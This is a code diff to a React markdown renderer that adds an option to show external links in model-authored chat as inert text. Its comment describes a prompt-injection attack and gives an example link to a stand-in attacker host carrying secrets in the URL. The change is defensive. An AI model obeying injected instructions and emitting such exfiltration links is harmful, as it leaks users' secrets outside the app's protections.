@@ -30,6 +30,24 @@ export interface MarkdownRenderOptions {
   onNavigate?: (docId: string) => void;
   /** Recognize Obsidian-style [[wikilinks]] inside plain text. */
   enableWikilinks?: boolean;
+  /**
+   * Render external links as inert text showing the full URL instead of a
+   * clickable anchor. For surfaces whose markdown is MODEL-authored (chat):
+   * a prompt injection hidden in a document can otherwise make the model emit
+   * `[click here](https://attacker/?q=<secrets>)`, turning one user click into
+   * an exfiltration channel that the CSP and offline guard never see, because
+   * the click leaves the app entirely.
+   */
+  inertExternalLinks?: boolean;
+}
+
+/** Show an external URL without making it one-click actionable. */
+function renderInertLink(key: string, url: string, children: ReactNode): ReactNode {
+  return (
+    <span key={key} className="md-inert-link" title={`External link (not clickable): ${url}`}>
+      {children} <span className="md-inert-link__url">({url})</span>
+    </span>
+  );
 }
 
 /** A link that either jumps to a doc in the graph, or is shown unresolved. */
@@ -161,6 +179,7 @@ export function renderMarkdownNode(node: RootContent, key: string, opts: Markdow
         const docId = opts.resolveInternalLink(node.url);
         if (docId) return renderInternalLink(key, children, docId, opts);
         if (SAFE_LINK_PROTOCOL.test(node.url)) {
+          if (opts.inertExternalLinks) return renderInertLink(key, node.url, children);
           return (
             <a key={key} href={node.url} target="_blank" rel="noopener noreferrer">
               {children}
@@ -174,6 +193,7 @@ export function renderMarkdownNode(node: RootContent, key: string, opts: Markdow
       if (!SAFE_LINK_PROTOCOL.test(node.url)) {
         return <Fragment key={key}>{children}</Fragment>;
       }
+      if (opts.inertExternalLinks) return renderInertLink(key, node.url, children);
       return (
         <a key={key} href={node.url} target="_blank" rel="noopener noreferrer">
           {children}
